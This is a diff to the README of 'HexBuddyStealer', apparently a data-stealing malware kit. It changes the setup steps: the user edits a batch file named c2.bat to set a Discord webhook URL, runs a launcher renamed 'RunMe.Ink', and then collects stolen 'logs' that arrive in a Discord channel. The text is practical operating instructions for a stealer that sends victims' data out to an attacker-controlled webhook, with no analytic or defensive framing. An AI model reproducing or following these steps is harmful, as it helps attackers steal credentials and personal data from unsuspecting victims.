@@ -24,9 +24,9 @@ Then Name it !
 ![image](https://user-images.githubusercontent.com/82332026/194541917-7ebc027e-5f5e-420a-ac74-93d5676ff74c.png)
 
 
-4. Go To /Bin/cs.bat file in the Downloaded Folder in HexBuddyStealer and open in Notepad
+4. Go To /Bin/c2.bat file in the Downloaded Folder in HexBuddyStealer and open in Notepad
 5. Edit The "set "Webtoken=https://discord.com/api/webhooks/your_webhook_here" "
-6. Run The "launch.bat" and wait for 13 seconds
+6. Run The "RunMe.Ink" and wait for 13 seconds
 7. Then Look At The General Channel On Discord .... You will Already Recieve Notifactions In The Channel 
 8. Enjoy The Logs <3
 
